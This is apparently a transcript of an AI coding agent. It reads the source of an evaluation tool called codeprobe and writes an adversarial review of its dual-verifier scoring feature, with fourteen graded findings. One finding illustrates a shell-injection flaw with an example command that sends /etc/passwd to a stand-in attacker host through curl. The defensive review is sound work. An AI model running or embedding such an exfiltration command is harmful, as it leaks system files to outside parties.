● Read scoring.py
  │ src/codeprobe/core/scoring.py
  └ 1 line read

● Read executor.py
  │ src/codeprobe/core/executor.py
  └ 1 line read

● Read writer.py
  │ src/codeprobe/mining/writer.py
  └ 1 line read

● Read report.py
  │ src/codeprobe/analysis/report.py
  └ 1 line read

● Read run_cmd.py
  │ src/codeprobe/cli/run_cmd.py
  └ 1 line read

● Read dual.py
  │ src/codeprobe/analysis/dual.py
  └ 73 lines read

● Read stats.py
  │ src/codeprobe/analysis/stats.py
  └ 549 lines read

● Read validate_cmd.py
  │ src/codeprobe/cli/validate_cmd.py
  └ 433 lines read

● Read rich_display.py
  │ src/codeprobe/cli/rich_display.py
  └ 319 lines read

● Read experiment.py
  │ src/codeprobe/models/experiment.py
  └ 116 lines read

● Read events.py
  │ src/codeprobe/core/events.py
  └ 276 lines read

● Read __init__.py
  │ src/codeprobe/loaders/__init__.py
  └ 165 lines read

● Read registry.py
  │ src/codeprobe/core/registry.py
  └ 115 lines read

● Read task.py
  │ src/codeprobe/models/task.py
  └ 153 lines read

● Read test_dual_e2e.py
  │ tests/test_dual_e2e.py
  └ 411 lines read

● Read test_dual_composite.py
  │ tests/test_dual_composite.py
  └ 144 lines read

● Read test_executor_dual_isolation.py
  │ tests/test_executor_dual_isolation.py
  └ 537 lines read

● Read test_writer_dual.py
  │ tests/test_writer_dual.py
  └ 214 lines read

● Read test_dual_scoring_details.py
  │ tests/test_dual_scoring_details.py
  └ 94 lines read

● Read test_dual_scorer.py
  │ tests/test_dual_scorer.py
  └ 407 lines read

● Read test_validate_dual.py
  │ tests/test_validate_dual.py
  └ 327 lines read

Now let me read the large files in sections:

● Read executor.py
  │ src/codeprobe/core/executor.py
  └ L1:100 (100 lines read)

● Read scoring.py
  │ src/codeprobe/core/scoring.py
  └ L600:750 (151 lines read)

● Read report.py
  │ src/codeprobe/analysis/report.py
  └ L1:100 (99 lines read)

● Read scoring.py
  │ src/codeprobe/core/scoring.py
  └ L750:800 (51 lines read)

● Read report.py
  │ src/codeprobe/analysis/report.py
  └ L100:400 (301 lines read)

● Read executor.py
  │ src/codeprobe/core/executor.py
  └ L100:350 (251 lines read)

● Read executor.py
  │ src/codeprobe/core/executor.py
  └ L350:600 (251 lines read)

● Read writer.py
  │ src/codeprobe/mining/writer.py
  └ L1:100 (100 lines read)

● Read report.py
  │ src/codeprobe/analysis/report.py
  └ L400:640 (239 lines read)

● Read writer.py
  │ src/codeprobe/mining/writer.py
  └ L100:350 (251 lines read)

● Read report.py
  │ src/codeprobe/analysis/report.py
  └ L640:700 (18 lines read)

● Read writer.py
  │ src/codeprobe/mining/writer.py
  └ L350:600 (251 lines read)

● Read executor.py
  │ src/codeprobe/core/executor.py
  └ L600:800 (201 lines read)

● Read executor.py
  │ src/codeprobe/core/executor.py
  └ L800:1000 (201 lines read)

● Read scoring.py
  │ src/codeprobe/core/scoring.py
  └ L1:100 (100 lines read)

Now let me check a few more specifics:

● Read scoring.py
  │ src/codeprobe/core/scoring.py
  └ L100:250 (151 lines read)

● Read scoring.py
  │ src/codeprobe/core/scoring.py
  └ L400:600 (201 lines read)

● Read scoring.py
  │ src/codeprobe/core/scoring.py
  └ L600:800 (201 lines read)

● Read executor.py
  │ src/codeprobe/core/executor.py
  └ L160:280 (121 lines read)

● Read executor.py
  │ src/codeprobe/core/executor.py
  └ L280:500 (221 lines read)

● Read report.py
  │ src/codeprobe/analysis/report.py
  └ L140:230 (90 lines read)

● Read writer.py
  │ src/codeprobe/mining/writer.py
  └ L190:320 (131 lines read)

● Read validate_cmd.py
  │ src/codeprobe/cli/validate_cmd.py
  └ L150:280 (131 lines read)

Now I have everything I need. Here is the full adversarial review:

---

## Adversarial Review: Dual-Verifier Mining (5cc6daf..HEAD)

---

### CRITICAL

---

**F1** [CRITICAL] `src/codeprobe/core/executor.py:249–275` — **Dual worktree breaks direct verification leg**

The executor creates an owned worktree for sequential dual tasks (`reward_type=="dual" and worktree_path is None`, lines 249–261). The agent writes code changes to `_effective_wt` (the owned worktree). But `tests/test.sh` is generated at mining time with `cd {shlex.quote(str(repo_path))}` hardcoded to the ORIGINAL repo path (`writer.py:529`). When `BinaryScorer._run_in_sandbox()` runs test.sh inside the scoring sandbox, it changes directory to the original (unmodified) repo — not the worktree where the agent's changes live.

**Failure scenario:** A single-worker dual run. Agent makes a correct fix in `_effective_wt`. `DualScorer` runs. Direct leg (BinaryScorer) runs `tests/test.sh` which does `cd /original/repo` — tests see unmodified state, exit non-zero. Direct leg always returns `score=0.0`. `scoring_policy="min"` now returns 0.0 even when both the code fix and answer.json are correct. Composite score is always 0 in sequential dual mode with the owned worktree.

Reproduction: write a passing dual task, run it sequentially without supplying `worktree_path`. Direct leg will fail regardless of agent output.

Note: the author's comment at line 243 acknowledges that "mined test.sh scripts hardcode `cd {repo_path}`" but the fix only addresses parallel cross-contamination — it does not fix the per-run single-task breakage.

**Minimal fix:** Pass `TASK_REPO_ROOT` env var from the executor to the scoring sandbox pointing to `_effective_wt or repo_path`, and change `_write_dual_task` to emit `cd "${TASK_REPO_ROOT}"` instead of the hardcoded path. `_run_in_sandbox` already injects env via `_safe_env()`.

**Confidence: HIGH** — read both the executor path (lines 249–275, 437–472) and writer.py (lines 525–534) and `_run_in_sandbox` (lines 136–192).

---

**F2** [CRITICAL] `src/codeprobe/cli/validate_cmd.py:234` + `tests/test_writer_dual.py:43,163` — **`scoring_policy="weighted_sum"` is both tested and invalid**

`_VALID_SCORING_POLICIES = frozenset({"", "min", "mean", "weighted"})`. The writer test at line 43 creates a `TaskVerification(scoring_policy="weighted_sum", reward_type="composite")` and at line 163 asserts `meta["verification"]["scoring_policy"] == "weighted_sum"`. This test passes because `write_task_dir` blindly calls `asdict(task)` — it never validates the payload.

Downstream consequences of a task written with these values:

1. `validate_cmd.py _check_scoring_policy()` returns `FAIL` — the task can never pass validation.
2. `DualScorer.score()` hits the `else` branch at line 738 — treats "weighted_sum" as the default policy (composite = direct score only). Weighted scoring silently doesn't apply. No error, no warning.
3. `load_task()` in `loaders/__init__.py` validates `reward_type not in VALID_REWARD_TYPES`. "composite" is not a member of `available_scorers()`, so `load_task()` raises `ValueError`. Any downstream consumer that calls `load_task()` on the written task crashes.

The test asserts broken behavior, masking a production gap: the miner can produce tasks that fail validation and score incorrectly.

**Minimal fix:** Add `scoring_policy` and `reward_type` validation to `write_task_dir` (or `_write_dual_task`) before calling `asdict`. Fix the test fixture to use `scoring_policy="weighted"`, `reward_type="dual"`.

**Confidence: HIGH** — read validate_cmd.py:234, test_writer_dual.py:43–163, DualScorer:738, loaders/__init__.py VALID_REWARD_TYPES check.

---

### HIGH

---

**F3** [HIGH] `src/codeprobe/mining/writer.py:530–531` — **Unquoted `cmd` in generated test.sh enables prefix-bypass injection**

```python
test_script = (
    ...
    f"cd {shlex.quote(str(repo_path))}\n"
    f"{cmd}\n"          # ← RAW, unquoted
)
```

The allowlist check (`writer.py:521–523`) gates on prefix: `cmd.startswith("bash tests/test.sh")`. A command like `bash tests/test.sh; curl -s attacker.com/$(cat /etc/passwd)` starts with the allowed prefix, passes the check, and is embedded verbatim in test.sh. When the scoring sandbox runs the script, the injected shell code executes in the scoring process's context.

**Failure scenario:** A crafted or corrupted `task.verification.command` value in a task TOML or experiment config — e.g., from a third-party task registry or a mining pipeline that ingests PR data — executes arbitrary shell commands during scoring.

**Minimal fix:** Enforce exact-match only (no `startswith`) for multi-word commands, or shell-split and individually validate each token. Alternatively, run test.sh via `bash -euo pipefail tests/test.sh` and prohibit any command containing shell metacharacters (`; & | $( \`` etc.) at writer time.

**Confidence: HIGH** — read writer.py:260–268, 521–534.

---

**F4** [HIGH] `src/codeprobe/core/scoring.py:773–786` — **`get_scorer()` return type annotation lies**

```python
def get_scorer(
    reward_type: str,
) -> BinaryScorer | ContinuousScorer | CheckpointScorer | ArtifactScorer:
```

`DualScorer` is not in the return type union. `resolve_scorer("dual")` returns a `DualScorer` instance. Any code that calls `get_scorer("dual")` and then branches on the return type (e.g., via `isinstance`) will silently fall through. Type checkers (mypy/pyright) will report errors on callers that access `DualScorer`-specific attributes. The annotation was already fixed once (the signature-fix commit) but the return type was not updated.

Additionally: `get_scorer("dual")` creates a new `DualScorer()` instance. `executor.py:419` calls `get_scorer(reward_type)`. When `reward_type="dual"`, the executor uses this as a `Scorer` — fine at runtime due to structural typing, but a lie in the interface contract.

**Minimal fix:** Add `| DualScorer` to the return type union, or change to `-> Scorer` (using the Protocol type).

**Confidence: HIGH** — read scoring.py:773–786, registry.py.

---

**F5** [HIGH] `tests/test_executor_dual_isolation.py:492–526` — **Parallel stress test verifies only sandbox isolation, not worktree isolation**

```python
unique_paths = {str(p) for p in fake.calls}
assert len(unique_paths) == 12, "scoring sandbox dirs were re-used"
```

`fake.calls` records the `task_dir` argument — which is the `TemporaryDirectory` path. This proves 12 distinct temp dirs were created. It does NOT verify:

- That the 12 worktrees (from `WorktreeIsolation`) were distinct.
- That no cross-run answer.json/reward.txt contamination occurred in the worktrees.
- Any real file I/O (the `_FakeDualScorer` stub never calls `ArtifactScorer` or `BinaryScorer`).

The concurrency safety of the dual scoring flow with real file I/O is entirely untested. The test is a confidence trap: it looks exhaustive but exercises nothing meaningful about the dual scoring logic.

**Minimal fix:** Add a real-scorer parallel stress test that writes distinct `answer.json` payloads per run and asserts each run gets its own score. This must use a real (non-mock) `DualScorer`.

**Confidence: HIGH** — read test_executor_dual_isolation.py:492–526, 396–430.

---

**F6** [HIGH] `src/codeprobe/analysis/report.py:151` vs `format_html_report` — **Mixed dual/non-dual report column schema is inconsistent between formats**

`format_text_report` uses a GLOBAL flag `any_dual_tasks` (line 151) so ALL configs in the table get the Artifact column when ANY config has dual tasks. `format_html_report` computes `config_has_dual` per-config. In a side-by-side experiment (config A = dual, config B = non-dual), the text report renders both with an Artifact column (config B gets "—"), but HTML renders config A with the Artifact column and config B without. `format_csv_report` always emits `score_artifact` column regardless (via `_build_task_rows`).

**Failure scenario:** A user compares text and HTML outputs of the same mixed experiment. Text shows task scores side-by-side under the same column headers. HTML silently drops the Artifact column from the non-dual config's section. A downstream script parsing HTML may infer different column counts and misalign values.

**Minimal fix:** In `format_html_report`, use the same global `any_dual_tasks` flag (derived from `report.summaries`) instead of per-config detection. Keep it consistent with text.

**Confidence: HIGH** — read report.py:151, 195–215 (text), and `format_html_report` dual column logic.

---

### MEDIUM

---

**F7** [MEDIUM] `src/codeprobe/core/scoring.py:621–639` — **`_safe_leg_score` loses exception tracebacks; crashes look identical to "scored 0"**

```python
except Exception as exc:
    return ScoreResult(score=0.0, passed=False, error=f"scorer raised: {exc}")
```

No `logger.exception()` or `logger.error()` call. The traceback is silently discarded. `str(exc)` for a `PermissionError` or `MemoryError` produces a one-line message indistinguishable from a "normal" zero score with an error message. In production, diagnosing why the direct leg always returns 0 requires inserting debug logging — the failure origin is lost.

**Failure scenario:** `ArtifactScorer.score()` raises `RecursionError` on a pathologically deep `ground_truth.json`. The result is `score=0.0, error="scorer raised: maximum recursion depth exceeded"`. This looks like a legitimate empty `answer.json`, not a scorer crash. The `scoring_details.error_artifact` field carries the string but no traceback.

**Minimal fix:** Add `logger.exception("Leg scorer raised: %s", exc)` before the `return` statement in the `except` block.

**Confidence: HIGH** — read scoring.py:621–639.

---

**F8** [MEDIUM] `src/codeprobe/models/experiment.py:96` vs `src/codeprobe/core/events.py:60` — **`CompletedTask.scoring_details` default is `{}` but `TaskScored.scoring_details` default is `None`**

`CompletedTask.scoring_details: dict = field(default_factory=dict)` (experiment.py:96). `TaskScored.scoring_details: dict | None = None` (events.py:60). The executor explicitly constructs `scoring_details` at line 482–487, so runtime behavior is consistent. But:

- Old checkpointed results loaded from disk that predate dual: `entry.get("scoring_details", {})` → `CompletedTask.scoring_details = {}`.
- When those tasks emit `TaskScored` events, the executor checks `dict(result.scoring_details) if result.scoring_details else None` (line 842–844). An empty `{}` is falsy → `scoring_details=None` in the event.
- Event consumers that check `event.scoring_details is not None` see `None` and skip; consumers that check `bool(event.scoring_details)` also skip. Consistent by accident, but the model/event defaults diverge.

**Minimal fix:** Align defaults: change `TaskScored.scoring_details` to `dict = field(default_factory=dict)`, or flip the executor emit check to `result.scoring_details if result.scoring_details else {}`.

**Confidence: HIGH** — read experiment.py:96, events.py:60, executor.py:842–844.

---

**F9** [MEDIUM] `src/codeprobe/core/scoring.py:716–727` — **`error_direct`/`error_artifact` are lost on `DualScoringDetails.from_dict()` round-trip**

`DualScorer.score()` stores `error_direct` and `error_artifact` as top-level keys in `details` (lines 724–727). The executor merges these into `scoring_details` via `scoring_details.update(dict(score_result.details))`. The stored dict has shape:

```json
{"passed": true, "error": null, "score_direct": 1.0, "score_artifact": 0.0,
 "passed_direct": true, "passed_artifact": false,
 "error_artifact": "answer.json missing 'answer' field", "scoring_policy": "weighted"}
```

`DualScoringDetails.from_dict()` (experiment.py) reads `d.get("extra", {})` to populate the `extra` field. `error_artifact` is NOT under `"extra"` — it's a top-level key. `from_dict()` does not map it. When a downstream consumer calls `DualScoringDetails.from_dict(stored_dict)`, `extra` is `{}` and `error_direct`/`error_artifact` are silently dropped.

**Failure scenario:** Debug tooling that reconstructs `DualScoringDetails` from a JSON checkpoint to display per-leg error messages finds empty `extra`, cannot display why the artifact leg failed. Silent data loss on round-trip.

**Minimal fix:** In `from_dict()`, explicitly populate `error_direct` and `error_artifact` from top-level keys (or store them under `extra` in `DualScorer.score()`).

**Confidence: HIGH** — read scoring.py:716–727, experiment.py DualScoringDetails.from_dict.

---

**F10** [MEDIUM] `tests/test_dual_e2e.py:229` — **E2E test bypasses the owned-worktree code path entirely**

```python
# Caller-supplied worktree so the adapter knows exactly where to write
# answer.json. Providing worktree_path ALSO bypasses the executor's
# owned dual-isolation pool (verified by u6 tests).
```

The E2E test provides `worktree_path=worktree` which forces `reward_type=="dual" and worktree_path is None` to be False (executor:249). The entire `_owned_dual_iso` / `_owned_dual_wt` block never runs in this test. The test never exercises:

- `WorktreeIsolation` construction with `namespace=f"dual-{task_id}-{uuid...}"`.
- Worktree acquisition/cleanup in the finally block.
- The fallback `_error_result` when worktree creation fails (lines 262–272).

These paths are only tested by `test_executor_dual_isolation.py`, which uses a fake scorer. The real end-to-end dual flow (real scorer + owned worktree) has zero test coverage.

**No fix possible without adding a test.** Add an E2E test that does NOT supply `worktree_path` and uses `reward_type="dual"`.

**Confidence: HIGH** — read test_dual_e2e.py:220–270, executor.py:249–275.

---

**F11** [MEDIUM] No regression test for pre-dual checkpoint loading through all report formats

There is no test that:
1. Loads a JSON/TOML checkpoint produced before the dual commits (where `scoring_details` is missing or `{}`).
2. Passes it through all four report formatters (`format_text_report`, `format_html_report`, `format_csv_report`, `format_json_report`).
3. Asserts no crash and correct "—" / `null` rendering for the Artifact column.

`report.py` accesses `task.scoring_details or {}` and uses `_task_has_dual()` checks throughout. These look defensively written. But untested backward-compat paths in report rendering are a crash risk on the first operator who runs `codeprobe report` on a pre-dual experiment directory.

**Minimal fix:** Add a parametrized test in `tests/test_dual_composite.py` that builds a `CompletedTask(scoring_details={})` and passes it through all four formatters.

**Confidence: MEDIUM** — checked the report code paths; no test file explicitly exercises the empty-scoring_details path through formatters.

---

### LOW

---

**F12** [LOW] `src/codeprobe/analysis/dual.py` vs `src/codeprobe/analysis/stats.py` — **Dual-detection logic is duplicated and will diverge**

`has_dual_scoring(task)` (dual.py) checks `bool(task.scoring_details and "score_direct" in task.scoring_details)`. `_task_has_dual_details(task)` (stats.py) checks `isinstance(task.scoring_details, dict) and "score_direct" in task.scoring_details`. Two implementations of semantically identical logic. `report.py` imports yet another local `_task_has_dual` inline. Three separate implementations; any bug fix applied to one will not automatically apply to the others.

**Minimal fix:** Extract a single canonical `has_dual_scoring()` and import it everywhere.

**Confidence: HIGH** — read dual.py, stats.py, report.py.

---

**F13** [LOW] `src/codeprobe/analysis/dual.py` — **`dual_composite` supports "gate" strategy; validator and DualScorer do not**

`dual_composite(strategy="gate")` is implemented in dual.py but:
- `_VALID_SCORING_POLICIES` in validate_cmd.py (line 234) does not include "gate" → task fails validation.
- `DualScorer.score()` does not handle "gate" → treated as default policy (direct only) silently.

"gate" is therefore an undiscoverable strategy: it can't be set in task metadata without failing validation, and even if forced through, DualScorer ignores it.

**Minimal fix:** Add "gate" to `_VALID_SCORING_POLICIES` and implement it in `DualScorer.score()`, or remove it from `dual_composite`.

**Confidence: HIGH** — read dual.py, validate_cmd.py:234, scoring.py:729–739.

---

**F14** [LOW] `src/codeprobe/cli/validate_cmd.py:192` + `src/codeprobe/core/scoring.py:458–461` — **No size limit on `ground_truth.json` deserialization**

`_check_ground_truth_dual()` uses `json.load()` with no size guard. `ArtifactScorer._load_json_file()` uses `path.read_text()` then `json.loads()` — the entire file is read into memory. A `ground_truth.json` with millions of file paths or deeply nested structure would exhaust memory. The file comes from a task directory that could be attacker-controlled (mined from a public repo).

**Failure scenario:** A crafted task repo ships a 500MB `ground_truth.json`. The codeprobe eval worker OOMs. `_safe_leg_score` catches the resulting `MemoryError`... except `MemoryError` inherits from `Exception`, so it IS caught and silently returns `score=0.0`. No alarm raised.

**Minimal fix:** Add `path.stat().st_size > _MAX_GT_SIZE` check before `read_text()` in `_load_json_file`, with a configurable limit (e.g., 10MB).

**Confidence: HIGH** — read scoring.py:454–461, validate_cmd.py:192–231.

---

### Summary table

| # | Severity | File(s) | Area |
|---|----------|---------|------|
| F1 | CRITICAL | executor.py:249–275, writer.py:529 | Concurrency / architecture |
| F2 | CRITICAL | validate_cmd.py:234, test_writer_dual.py:43,163 | Data integrity / test blindspot |
| F3 | HIGH | writer.py:530–531 | Security (shell injection) |
| F4 | HIGH | scoring.py:773–786 | Protocol / Liskov |
| F5 | HIGH | test_executor_dual_isolation.py:492–526 | Test blindspot |
| F6 | HIGH | report.py:151 + html path | Report format gap |
| F7 | MEDIUM | scoring.py:621–639 | Error masking |
| F8 | MEDIUM | experiment.py:96, events.py:60 | Serialization / backward compat |
| F9 | MEDIUM | scoring.py:716–727 | Serialization round-trip |
| F10 | MEDIUM | test_dual_e2e.py:229 | Test blindspot |
| F11 | MEDIUM | (no test file) | Backward compat / test blindspot |
| F12 | LOW | dual.py, stats.py | Code duplication |
| F13 | LOW | dual.py, validate_cmd.py:234 | Feature gap |
| F14 | LOW | scoring.py:458–461, validate_cmd.py:192 | Security (DoS) |


Changes   +0 -0
Requests  1 Premium (6m 43s)
Tokens    ↑ 1.1m • ↓ 23.9k • 856.6k (cached)
